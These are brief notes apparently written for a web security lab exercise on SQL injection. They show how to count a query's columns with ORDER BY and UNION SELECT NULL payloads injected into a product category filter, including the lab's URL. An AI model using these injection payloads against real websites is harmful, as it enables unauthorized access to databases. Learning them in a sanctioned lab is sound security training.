 SQL injection UNION attack, determining the number of columns returned by the query

 SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

 Method 1 :Manually Use ORDER BY Clause: Try as many times as possible.
 On the URL https://acec1fe41e2eeaf8c01ab94d00ef0051.web-security-academy.net/filter?category=Corporate+gifts' ORDER BY 1--

Method 2 Use Burp Suite to Intercept the PROXY.
USE : ' UNION select NULL,+NULL,+NULL-- {Untill the GET request is OK}

